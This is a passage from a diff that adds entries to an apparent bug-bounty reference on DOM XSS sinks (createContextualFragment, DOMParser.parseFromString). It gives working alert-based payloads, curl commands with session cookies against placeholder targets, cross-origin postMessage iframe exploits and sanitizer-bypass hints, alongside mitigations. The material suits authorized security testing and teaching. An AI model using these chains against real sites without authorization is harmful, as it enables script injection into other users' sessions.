+              "indicator": "the marker renders as live markup, proving the API field reaches createContextualFragment unsanitized"
+            },
+            {
+              "action": "Store an execution payload and verify cross-account",
+              "payload": "<svg onload=alert(document.domain)>",
+              "command": "curl -s -X POST 'https://TARGET/api/notes' -H 'Cookie: session=SESSION_ID' -H 'Content-Type: application/json' -d '{\"html\":\"<svg onload=alert(document.domain)>\"}' then open the note as a second test account",
+              "indicator": "the alert fires in the second account's session"
+            }
+          ],
+          "eligibility": "Stored XSS with a victim view is a solid P2; same-account-only is self-XSS."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Verify message data reaches the fragment API",
+              "payload": "<b>jlf-trace</b>",
+              "command": "postMessage('<b>jlf-trace</b>','*') from the console on https://TARGET/page and watch the DOM",
+              "indicator": "the marker appears in the page and the listener lacks strict origin validation"
+            },
+            {
+              "action": "Execute cross-origin via the fragment",
+              "payload": "<img src=x onerror=alert(document.domain)>",
+              "command": "open a page hosting <iframe src=\"https://TARGET/page\"></iframe><script>onload=()=>frames[0].postMessage('<img src=x onerror=alert(document.domain)>','*')</script>",
+              "indicator": "the alert fires inside the target frame"
+            }
+          ],
+          "eligibility": "Accepted with missing/bypassable origin checks; quote the listener."
+        }
+      ],
+      "contexts": {
+        "range-context": "Parsing obeys the range's context node. A range created on document.body parses generic markup; a range on a table element requires table-valid payloads.",
+        "fragment-staging": "Nodes in a DocumentFragment are inert until inserted: event handlers fire only after append/insert. A PoC that stops at fragment creation shows nothing — always complete the insertion step in DevTools.",
+        "attr": "Taint inside attributes of the fragment string: '\" autofocus onfocus=alert(document.domain) x=\"'."
+      },
+      "waf_notes": "Server-side filters behave as for innerHTML. Client-side, hooks and sanitizers that override only innerHTML miss this API entirely — check for DOMPurify-like wrapping at the call site rather than assuming framework coverage.",
+      "eligibility": "Accepted as DOM XSS. Because the API is unfamiliar, include a one-line explanation (parses HTML like innerHTML) in the report so triage does not bounce it as 'theoretical'.",
+      "mitigations": [
+        "Replace fragment-from-string patterns with template cloning or DOM APIs.",
+        "Sanitize with DOMPurify before createContextualFragment if markup is required.",
+        "Enforce Trusted Types to block string-to-DOM conversion."
+      ],
+      "related": [
+        "innerHTML",
+        "insertAdjacentHTML",
+        "DOMParser.parseFromString"
+      ],
+      "references": [
+        "MDN: Range.createContextualFragment()",
+        "PortSwigger: DOM-based XSS"
+      ]
+    },
+    {
+      "id": "sink-domparser",
+      "name": "DOMParser.parseFromString",
+      "category": "dom-write",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "DOMParser",
+        "parseFromString",
+        "new DOMParser"
+      ],
+      "severity": "P3",
+      "severity_note": "P3 and frequently a false positive: the parsed document is INERT (scripts and handlers do not fire) until its nodes are adopted into the live document. Exploitability depends entirely on the adoption step.",
+      "explain": "new DOMParser().parseFromString(string, 'text/html') parses attacker markup into a detached Document. Nothing in that document executes — the parser sets the 'already started' flag on scripts and does not fire events for a non-rendering document.",
+      "how_it_works": "The danger is the SECOND step: code that copies nodes from the parsed document into the live DOM via appendChild, importNode, innerHTML of the parsed body, or querySelector extraction. On adoption, event handlers (onerror, onload) fire and active content becomes live. Adopted <script> nodes still do not execute when moved wholesale, but markup serialized and re-parsed (e.g. doc.body.innerHTML assigned elsewhere) follows innerHTML rules.",
+      "why_it_matters": "parseFromString shows up in sanitization pipelines, RSS/HTML preview renderers, and email viewers. The classic bug: developers believe DOMParser output is 'safe by default' and adopt it wholesale — turning an inert parse into full DOM XSS. Correct severity assessment here separates real findings from the scanner noise this sink generates.",
+      "exploitable_when": [
+        "location.hash",
+        "fetch-response",
+        "xhr-response",
+        "postMessage-data"
+      ],
+      "chains": [
+        {
+          "source": "fetch-response",
+          "steps": [
+            {
+              "action": "Trace an API field through parse and adoption",
+              "payload": "<b>jlf-trace</b>",
+              "command": "curl -s -X POST 'https://TARGET/api/preview' -H 'Cookie: session=SESSION_ID' -H 'Content-Type: application/json' -d '{\"html\":\"<b>jlf-trace</b>\"}' then load the page, breakpoint the parseFromString call, and step to the adoption (appendChild/importNode/innerHTML)",
+              "indicator": "the marker exists first in the detached document, then appears as live DOM after the adoption line executes"
+            },
+            {
+              "action": "Prove handler execution after adoption",
+              "payload": "<img src=x onerror=alert(document.domain)>",
+              "command": "submit the payload through the same endpoint and reload the viewing page",
+              "indicator": "the alert fires only AFTER the adoption step — setting a breakpoint before it shows no execution, confirming the mechanism"
+            },
+            {
+              "action": "Distinguish adoption styles if the first payload fails",
+              "payload": "<svg onload=alert(document.domain)>",
+              "command": "if nodes are moved via doc.body.innerHTML re-serialization, handlers still fire but <script> never does; if moved node-by-node with importNode, the same holds — record which adoption style the code uses",
+              "indicator": "the alert fires with handler-based payloads; document that <script> payloads fail and why"
+            }
+          ],
+          "eligibility": "Valid stored/reflected XSS ONLY when live-DOM adoption is demonstrated. A parse-only flow (no adoption) is not exploitable — do not report the inert case as XSS; mention it as defense-in-depth at most."
+        },
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Confirm parse plus adoption of fragment data",
+              "payload": "#<b>jlf-trace</b>",
+              "command": "open 'https://TARGET/page#<b>jlf-trace</b>' and verify the marker reaches live DOM, not just the detached document",
+              "indicator": "the marker node is present in the rendered page (check document.contains(node) at the breakpoint)"
+            },
+            {
+              "action": "Fire the handler payload",
+              "payload": "#<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/page#<img src=x onerror=alert(document.domain)>' in a browser",
+              "indicator": "the alert fires after adoption"
+            }
+          ],
+          "eligibility": "Accepted as DOM XSS when adoption is shown; fragment delivery is server-WAF-blind."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Verify the parse-adopt flow with message data",
+              "payload": "<b>jlf-trace</b>",
+              "command": "postMessage('<b>jlf-trace</b>','*') from the console on https://TARGET/page and confirm adoption into live DOM",
+              "indicator": "the marker appears in the page and the listener lacks strict origin validation"
+            },
+            {
+              "action": "Execute cross-origin after adoption",
+              "payload": "<svg onload=alert(document.domain)>",
+              "command": "open a page hosting <iframe src=\"https://TARGET/page\"></iframe><script>onload=()=>frames[0].postMessage('<svg onload=alert(document.domain)>','*')</script>",
+              "indicator": "the alert fires inside the target frame once the nodes are adopted"
+            }
+          ],
+          "eligibility": "Accepted with missing/bypassable origin checks; the parse-then-adopt chain must be shown end-to-end."
+        }
+      ],
+      "contexts": {
+        "detached-document": "Everything inert: no script, no handlers, no resource loads except some preloading edge cases. Never a finding by itself.",
+        "adopted-nodes": "Handlers fire on adoption. Payloads: <img src=x onerror=alert(document.domain)>, <svg onload=alert(document.domain)>. Wholesale-moved <script> stays inert.",
+        "reserialized": "doc.body.innerHTML re-assigned to a live element: pure innerHTML rules — handlers fire, scripts inert, mutation-XSS tricks apply."
+      },
+      "waf_notes": "Server filters see only fetch/XHR payloads; fragment and postMessage paths are blind spots. Client-side, DOMParser flows often sit AFTER a sanitizer (parse, walk, allowlist, adopt) — test the sanitizer's allowlist for mutation-XSS (namespace confusion with <svg>/<math>) rather than raw tag injection.",
+      "eligibility": "High false-positive rate from scanners. Report only with a demonstrated adoption step and a firing payload; inert parse-only flows are informational. Mutation-XSS bypasses of the surrounding sanitizer are separately valuable and usually graded higher.",
+      "mitigations": [
+        "Sanitize the parsed document with an allowlist walker (or DOMPurify) before any adoption.",
+        "Adopt only text nodes and known-safe elements; never adopt wholesale body content.",
+        "Enforce Trusted Types at the final DOM insertion point."
+      ],
+      "related": [
+        "innerHTML",
+        "createContextualFragment",
+        "insertAdjacentHTML"
+      ],
+      "references": [
+        "MDN: DOMParser.parseFromString()",
+        "PortSwigger: DOM-based XSS",
+        "OWASP WSTG: Testing for DOM-based Cross Site Scripting (WSTG-CLNT-01)"
+      ]
+    }
+  ]
+}
